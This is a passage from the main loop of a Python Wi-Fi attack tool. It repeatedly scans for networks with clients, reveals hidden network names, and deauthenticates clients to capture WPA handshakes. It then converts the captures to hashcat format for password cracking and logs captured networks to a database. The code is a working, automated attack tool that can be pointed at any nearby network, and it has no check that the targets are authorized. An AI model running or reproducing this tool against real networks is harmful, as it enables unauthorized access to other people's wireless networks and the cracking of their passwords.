            stats["cycles"] = cycle
            logging.info("=== Cycle %d ===", cycle)
            networks = get_networks_with_clients(
                mon_iface, args.time, scan_temp_dir, skip_bssids, skip_essids, current_proc_holder, args.channel
            )
            stats["candidate_networks"] += len(networks)
            if not networks:
                logging.info("No new networks with clients; rescanning in 60s")
                time.sleep(60)
                continue

            for net in networks:
                bssid = net["bssid"]
                channel = net["channel"]
                essid = net["essid"]
                clients = net["clients"]
                if not channel:
                    logging.warning("Skipping %s (no channel)", bssid)
                    stats["skipped"] += 1
                    continue
                if bssid.lower() in skip_bssids:
                    stats["skipped"] += 1
                    continue
                if fail_count.get(bssid.lower(), 0) >= MAX_FAILURES_BEFORE_SKIP:
                    logging.debug("Skipping %s (%s): failed %d times this run", bssid, essid or "?", fail_count[bssid.lower()])
                    stats["skipped"] += 1
                    continue

                if target_bssids and bssid.lower() not in target_bssids:
                    stats["skipped"] += 1
                    continue
                if target_essids and essid not in target_essids:
                    stats["skipped"] += 1
                    continue

                if essid == "hidden_network":
                    stats["hidden_detected"] += 1
                    logging.info("Hidden network detected: BSSID %s. Attempting ESSID recovery...", bssid)
                    cached = discovered_essids.get(bssid.lower())
                    if cached:
                        essid = cached
                        net["essid"] = cached
                        logging.info("Using cached ESSID for hidden BSSID %s: %s", bssid, cached)
                    else:
                        revealed = reveal_hidden_essid(
                            mon_iface, bssid, channel, clients,
                            scan_temp_dir, current_proc_holder,
                            timeout_sec=args.hidden_wait,
                        )
                        if revealed:
                            essid = revealed
                            net["essid"] = revealed
                            discovered_essids[bssid.lower()] = revealed
                            conn.execute(
                                "INSERT OR REPLACE INTO discovered_essids (bssid, essid, discovered_at) VALUES (?,?,?)",
                                (bssid, revealed, time.strftime("%Y-%m-%d %H:%M:%S")),
                            )
                            conn.commit()
                            stats["hidden_resolved"] += 1
                            logging.info("ESSID revealed: %s", revealed)
                        else:
                            logging.info("Could not reveal ESSID for %s; continuing with hidden_network", bssid)

                safe_essid = re.sub(r'[^\w\-.]', "_", essid or "unknown")[:32]
                short_hash = hashlib.sha1(bssid.encode()).hexdigest()[:8]
                cap_name = f"hs_{bssid.replace(':', '')}_{safe_essid}"
                cap_path = handshakes_dir / cap_name

                success = capture_handshake(
                    mon_iface, bssid, channel, clients, cap_path, max_deauth=5,
                    current_proc_holder=current_proc_holder,
                    essid=essid,
                    ap_timeout=args.ap_timeout,
                )
                stats["attempted"] += 1
                if success:
                    stats["success"] += 1
                    final_cap = Path(str(cap_path) + "-01.cap")
                    if not final_cap.exists():
                        for p in handshakes_dir.glob(cap_name + "*"):
                            if p.suffix == ".cap":
                                final_cap = p
                                break
                    if final_cap.exists():
                        # Convert with hcxpcapngtool first; only consider crackable if it produces valid .22000
                        # (aircrack-ng can give false positives; hcxpcapngtool is the authority for crackability)
                        final_name = handshakes_dir / f"{safe_essid}_{short_hash}_{bssid.replace(':', '')}.cap"
                        hc_path = convert_cap_to_hashcat(final_cap)
                        if hc_path is None:
                            # Not crackable per hcxpcapngtool (false positive or tool missing); keep attacking
                            fail_count[bssid.lower()] = fail_count.get(bssid.lower(), 0) + 1
                            for leftover in handshakes_dir.glob(cap_name + "*"):
                                try:
                                    leftover.unlink()
                                except OSError:
                                    pass
                                if args.verbose:
                                    logging.warning(
                                        "Not marking %s (%s) as captured: hcxpcapngtool did not produce valid .22000 (will retry)",
                                        bssid, essid or "?",
                                    )
                                else:
                                    logging.debug(
                                        "Not marking %s (%s) as captured: hcxpcapngtool did not produce valid .22000 (will retry)",
                                        bssid, essid or "?",
                                    )
                        else:
                            # Valid crackable handshake: keep .cap and .22000, mark as captured
                            try:
                                final_cap.rename(final_name)
                            except OSError:
                                final_name = final_cap
                            # Remove only non-.cap/.pcap/.22000 from this capture
                            for leftover in handshakes_dir.glob(cap_name + "*"):
                                if leftover.suffix.lower() not in (".cap", ".pcap", ".22000"):
                                    try:
                                        leftover.unlink()
                                    except OSError:
                                        pass
                            # Rename .22000 to match final_name (e.g. ESSID_BSSID.cap.22000)
                            expected_22000 = final_name.with_suffix(final_name.suffix + ".22000")
                            if hc_path != expected_22000 and hc_path.exists():
                                try:
                                    hc_path.rename(expected_22000)
                                except OSError:
                                    pass
                                hc_path = expected_22000 if expected_22000.exists() else hc_path
                            logging.info("Hashcat format saved: %s (use: hashcat -m 22000 ...)", hc_path)
                            conn.execute(
                                "INSERT OR REPLACE INTO captured (bssid, essid, handshake_path, created_at) VALUES (?,?,?,?)",
                                (bssid, essid, str(final_name), time.strftime("%Y-%m-%d %H:%M:%S")),
                            )
                            conn.commit()
                            reload_skip_list()
                            logging.info("Stored valid handshake: %s (%s) -> %s", bssid, essid or "?", final_name)
                    else:
                        logging.warning("Handshake verified but cap file not found")
                else:
                    # Clean leftover capture files (.csv, etc.) when no handshake
                    stats["failed"] += 1
                    fail_count[bssid.lower()] = fail_count.get(bssid.lower(), 0) + 1
                    for leftover in handshakes_dir.glob(cap_name + "*"):
                        try:
                            leftover.unlink()
                        except OSError:
                            pass
                    logging.info("No handshake for %s (%s) this round; will retry in next cycle", bssid, essid or "?")

                if args.ap_delay and args.ap_delay > 0:
                    logging.debug("Waiting %ds before moving to next AP to avoid driver issues.", args.ap_delay)
                    time.sleep(args.ap_delay)

            logging.info("Cycle %d done; starting new scan.", cycle)

    finally:
        stats_stop.set()
        if stats_thread is not None:
            stats_thread.join(timeout=2)
        logging.info("Final statistics: %s", format_stats())
        set_managed_mode(mon_iface)
        try:
            verify_stored_handshakes(conn, handshakes_dir)
        except Exception as e:
            logging.debug("Verify on exit: %s", e)
        try:
            conn.close()
        except Exception:
            pass
        if scan_temp_dir is not None:
            shutil.rmtree(scan_temp_dir, ignore_errors=True)
        logging.info("Exiting.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
